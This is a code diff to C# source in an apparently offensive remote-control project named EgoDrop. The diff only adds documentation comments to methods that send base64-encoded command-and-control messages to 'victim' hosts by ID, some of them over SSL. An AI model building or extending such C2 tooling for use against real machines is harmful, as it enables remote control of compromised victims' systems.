@@ -198,11 +198,16 @@ namespace EgoDrop
         }
 
         /// <summary>
-        /// 
+        /// Send command to the remote host.
         /// </summary>
-        /// <param name="szMsg"></param>
+        /// <param name="szMsg">Message in string format.</param>
         public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|').ToList());
 
+        /// <summary>
+        /// Send command to the remote host with specified victim ID.
+        /// </summary>
+        /// <param name="szVictimID">Target victim ID.</param>
+        /// <param name="szMsg">Message in string format.</param>
         public void fnSendCommand(string szVictimID, string szMsg) => fnSendCommand(szVictimID, szMsg.Split('|').ToList());
 
         /// <summary>
@@ -212,16 +217,16 @@ namespace EgoDrop
         public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());
 
         /// <summary>
-        /// Send C2 COMMAND.
+        /// Send C2 command.
         /// </summary>
-        /// <param name="szVictimID"></param>
+        /// <param name="szVictimID">Message in string format.</param>
         /// <param name="aMsg"></param>
         public void fnSendCommand(string szVictimID, string[] aMsg) => fnSendCommand(szVictimID, aMsg.ToList());
 
         /// <summary>
-        /// 
+        /// Send C2 command to the remote host.
         /// </summary>
-        /// <param name="lsMsg"></param>
+        /// <param name="lsMsg">Message in List.</param>
         public void fnSendCommand(List<string> lsMsg)
         {
             lsMsg = lsMsg.Select(x => clsEZData.fnStrE2B64(x)).ToList();
@@ -248,6 +253,11 @@ namespace EgoDrop
             }
         }
 
+        /// <summary>
+        /// Send C2 command to the remote host with specified victim's ID.
+        /// </summary>
+        /// <param name="szVictimID">Target victim's ID.</param>
+        /// <param name="lsMsg">Message in List.</param>
         public void fnSendCommand(string szVictimID, List<string> lsMsg)
         {
             List<string> lsVictim = m_dicVictimChain[szVictimID];
@@ -257,25 +267,25 @@ namespace EgoDrop
         }
 
         /// <summary>
-        /// 
+        /// Send C2 command to victim through SSL.
         /// </summary>
         /// <param name="szMsg"></param>
         public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|').ToList());
 
         /// <summary>
-        /// 
+        /// Send C2 command to victim through SSL.
         /// </summary>
         /// <param name="aMsg"></param>
         public void fnSslSend(string[] aMsg) => fnSslSend(aMsg.ToList());
 
         /// <summary>
-        /// 
+        /// Send C2 command to victim through SSL.
         /// </summary>
         /// <param name="abBuffer"></param>
         public void fnSslSend(byte[] abBuffer) => fnSslSendRAW(new clsEDP(0, 0, abBuffer).fnabGetBytes());
 
         /// <summary>
-        /// 
+        /// Send C2 command to victim through SSL.
         /// </summary>
         /// <param name="lsMsg"></param>
         public void fnSslSend(List<string> lsMsg)
@@ -289,6 +299,11 @@ namespace EgoDrop
 
             fnSslSendRAW(abBuffer);
         }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="abBuffer"></param>
         public void fnSslSendRAW(byte[] abBuffer)
         {
             m_sslClnt.BeginWrite(abBuffer, 0, abBuffer.Length, new AsyncCallback((ar) =>
